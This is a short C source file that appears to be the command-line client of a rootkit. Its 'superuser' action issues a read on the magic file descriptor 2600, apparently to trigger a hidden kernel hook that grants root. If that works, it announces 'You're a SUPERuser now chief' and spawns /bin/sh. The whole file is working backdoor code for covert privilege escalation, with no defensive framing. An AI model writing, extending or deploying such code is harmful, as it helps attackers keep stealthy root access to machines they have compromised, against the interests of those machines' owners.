#include <unistd.h>
#include <stdlib.h>
#include <string.h>

#include <print.h>
#include <read.h>

int read_superuser() {
	int ret = read(2600, NULL, 0);
	if (ret == 0) {
		print_success("You're a SUPERuser now chief ;), opening a shell.");
		system("/bin/sh");	
	} else {
		print_error("Couldn't elevate your privileges");
	}
	return ret;
}

int read_run(const char *action) {
	
	const char *actions[] = { "superuser", NULL };
	if (action == NULL) {
		print_error("Read action not specified.");
		print_list("Here are all the actions you can do: ", actions);
		return -2;
	}

	if (!strncmp(action, actions[0], 10)) {
		return read_superuser();
	}
	
	print_error("Action doesn't exist.");
	return -2;
}
